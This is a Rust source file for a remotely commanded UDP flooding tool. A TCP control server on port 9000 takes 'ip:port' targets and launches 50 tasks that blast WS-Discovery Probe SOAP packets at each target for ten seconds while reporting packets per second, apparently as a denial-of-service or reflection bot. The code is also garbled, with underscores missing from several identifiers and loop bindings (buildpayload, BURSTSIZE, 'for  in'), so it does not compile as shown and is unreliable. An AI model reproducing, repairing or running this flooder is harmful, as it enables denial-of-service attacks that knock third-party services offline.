use tokio::net::{TcpListener, TcpStream, UdpSocket};
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::time::{sleep, Duration};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use anyhow::Result;

const THREADS: usize = 50;
const BURST_SIZE: usize = 5;
const DURATION_SECONDS: u64 = 10;
const CONTROL_PORT: u16 = 9000;

fn build_payload() -> Vec<u8> {
    let payload = br#"<?xml version="1.0" encoding="UTF-8"?>
<e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope"
            xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery">
  <e:Header>
    <w:MessageID>urn:uuid:STATIC-UUID-1234</w:MessageID>
    <w:To>urn:schemas-xmlsoap-org:ws:2005/04/discovery</w:To>
    <w:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</w:Action>
  </e:Header>
  <e:Body>
    <d:Probe>
      <d:Types>dn:NetworkVideoTransmitter</d:Types>
    </d:Probe>
  </e:Body>
</e:Envelope>"#;
    payload.to_vec()
}

async fn handle_flood(target: String, packet_count: Arc<AtomicU64>, running: Arc<AtomicU64>) -> Result<()> {
    let socket = UdpSocket::bind("0.0.0.0:0").await?;
    let payload = buildpayload();

    while running.load(Ordering::Relaxed) == 1 {
        for  in 0..BURSTSIZE {
            let  = socket.send_to(&payload, &target).await;
            packet_count.fetch_add(1, Ordering::Relaxed);
        }
    }
    Ok(())
}

async fn pps_monitor(packet_count: Arc<AtomicU64>, running: Arc<AtomicU64>) {
    let mut last_count = 0;
    while running.load(Ordering::Relaxed) == 1 {
        sleep(Duration::from_secs(1)).await;
        let current = packet_count.load(Ordering::Relaxed);
        println!("PPS: {}", current - last_count);
        last_count = current;
    }
}

async fn handle_client(stream: TcpStream) -> Result<()> {
    let reader = BufReader::new(stream);
    let mut lines = reader.lines();

    while let Ok(Some(line)) = lines.next_line().await {
        if let Some((ip, port_str)) = line.trim().split_once(':') {
            if let Ok(port) = port_str.parse::<u16>() {
                let target = format!("{}:{}", ip, port);
                println!("Received target: {}", target);

                let packet_count = Arc::new(AtomicU64::new(0));
                let running = Arc::new(AtomicU64::new(1));

                let monitor_handle = {
                    let pc = Arc::clone(&packet_count);
                    let run = Arc::clone(&running);
                    tokio::spawn(pps_monitor(pc, run))
                };

                let mut floodtasks = vec![];
                for  in 0..THREADS {
                    let pc = Arc::clone(&packet_count);
                    let run = Arc::clone(&running);
                    let tgt = target.clone();
                    flood_tasks.push(tokio::spawn(handle_flood(tgt, pc, run)));
                }

                sleep(Duration::from_secs(DURATION_SECONDS)).await;
                running.store(0, Ordering::Relaxed);

                for task in floodtasks {
                    let  = task.await;
                }
                let _ = monitor_handle.await;

                println!("Stopped for target: {}", target);
            }
        }
    }
    Ok(())
}

#[tokio::main]
async fn main() -> Result<()> {
    let listener = TcpListener::bind(("0.0.0.0", CONTROL_PORT)).await?;
    println!("TCP control server listening on port {}", CONTROLPORT);

    loop {
        let (stream, ) = listener.accept().await?;
        tokio::spawn(handle_client(stream));
    }
}
